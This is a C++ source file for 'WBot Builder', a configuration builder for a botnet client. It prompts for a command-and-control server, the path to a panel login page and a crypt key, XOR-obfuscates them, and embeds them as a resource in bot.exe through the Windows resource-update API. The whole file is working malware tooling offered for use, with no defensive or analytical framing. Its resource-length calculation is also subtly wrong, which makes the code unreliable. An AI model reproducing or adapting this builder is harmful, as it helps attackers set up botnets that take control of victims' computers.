#include <windows.h>
#include <iostream>
#include <string>
#define xor(a, b) { char *c = (a); while(*c) *c++ ^= (b); } //macro hackro
#include "bot/optimize.h"
using namespace std;
bool WriteResource(char* FileName,int ResourceName,char *Data, long ResourceTyp);
int main(){
   string SettingsHost,SettingsLoca,
	   SettingsKey,SettingsCrypted,delim="/!/";
   cout<<"WBot Builder Bot Version:1.3 (Date:15.9.09)"<<endl;
   cout<<"Server (ex google.com):";  cin>>SettingsHost;
   cout<<"Location of login.php (ex wbot/login.php):";  cin>>SettingsLoca;
   cout<<"Cryptkey (ex 123)!!!Must be the same as in Panel!!!:";  cin>>SettingsKey;
   
   SettingsCrypted=SettingsHost;
   SettingsCrypted+=delim;
   SettingsCrypted+=SettingsLoca;
   SettingsCrypted+=delim;
   SettingsCrypted+=SettingsKey+" ";
   char* Settings=(char*)SettingsCrypted.c_str();
   xor(Settings,'0');
   cout<<SettingsCrypted<<":::"<<endl<<Settings<<":;:;:;"<<endl;
   if(WriteResource("bot.exe",666,(char*)Settings,1337))
	   cout<<"succesfull written";
   else
	   cout<<"error";
}
bool WriteResource(char* FileName,int ResourceName,char* Data, long ResourceTyp){
	void* UpdateHandle;
    bool ReturnVal;
    
	UpdateHandle=BeginUpdateResource((const char*)FileName,false);
	if (UpdateHandle==0){
		cout<<"updateh";
		return false;
	}
	ReturnVal=UpdateResource(UpdateHandle,MAKEINTRESOURCEA(ResourceTyp),
           MAKEINTRESOURCEA(ResourceName),0,Data,sizeof(Data)*strlen(Data));
	if(!ReturnVal){
		cout<<"retval";
		return false;
	}
	ReturnVal=EndUpdateResource(UpdateHandle,false);
	return ReturnVal;
}
